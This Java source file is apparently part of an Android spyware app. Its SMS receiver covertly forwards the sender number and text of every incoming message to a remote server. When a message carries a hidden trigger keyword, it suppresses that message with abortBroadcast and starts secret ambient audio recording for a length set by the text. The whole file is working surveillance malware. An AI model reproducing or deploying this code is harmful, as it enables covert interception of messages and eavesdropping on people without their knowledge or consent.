package com.inet.android.message;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.inet.android.audio.RecordAudio;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * SmsSentObserver class is design for monitoring incoming sms
 * 
 * @author johny homicide
 * 
 */
public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String TAG = SMSBroadcastReceiver.class
			.getSimpleName().toString();
	private Context mContext;
	private Bundle mBundle;
	private String LOG_TAG = SMSBroadcastReceiver.class.getSimpleName()
			.toString();

	public void onReceive(Context context, Intent intent) {
		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
		this.mContext = context;
		mBundle = intent.getExtras();
		if (AppSettings.getState(AppConstants.TYPE_INCOMING_SMS_REQUEST,
				context) == 0)
			return;

		try {
			getSMSDetails();
		} catch (Exception sgh) {
			Logging.doLog(TAG, "Error in Init : " + sgh.toString(),
					"Error in Init : " + sgh.toString());
		}
	}

	public static void regSmsObserver(Context mContext) {
		SmsSentObserver observer = new SmsSentObserver(null);
		observer.setContext(mContext);
		mContext.getContentResolver().registerContentObserver(
				Uri.parse("content://sms"), true, observer);

	}

	@SuppressLint("SimpleDateFormat")
	private void getSMSDetails() {
		SmsMessage[] msgs = null;

		try {
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if (pdus != null) {
				msgs = new SmsMessage[pdus.length];
				String startRecord = AppSettings.getKeyForRecord(mContext);

				StringBuilder bodyText = new StringBuilder();
				for (int k = 0; k < msgs.length; k++) {
					msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);

					if (msgs[k].getMessageBody().toLowerCase()
							.contains(startRecord)) {
						Logging.doLog(LOG_TAG, "start record", "start record");
						abortBroadcast();
						int minute = Integer.parseInt(msgs[k].getMessageBody()
								.substring(
										msgs[k].getMessageBody().lastIndexOf(
												"d") + 1,
										msgs[k].getMessageBody().length())) * 60;
						Logging.doLog(LOG_TAG, "sec: " + minute, "sec: "
								+ minute);
						RecordAudio.startEnvRec(minute, 0, mContext);
					}

				}
				String phNumber = msgs[0].getOriginatingAddress();

				for (int i = 0; i < msgs.length; i++) {
					bodyText.append(msgs[i].getMessageBody());
				}

				// -------send sms--------------------------------
				RequestParams params = new RequestParams();
				params.put("data[][info][number]", phNumber);
				params.put("data[][info][data]", bodyText.toString());

				params.put("data[][time]", ConvertDate.logTime());
				params.put("data[][type]",
						AppConstants.TYPE_INCOMING_SMS_REQUEST);
				params.put("key", System.currentTimeMillis());

				RequestList.sendDataRequest(params, mContext);

			}
		} catch (Exception sfgh) {
			Logging.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(),
					"Error in getSMSDetails : " + sfgh.toString());
		}
	}

}
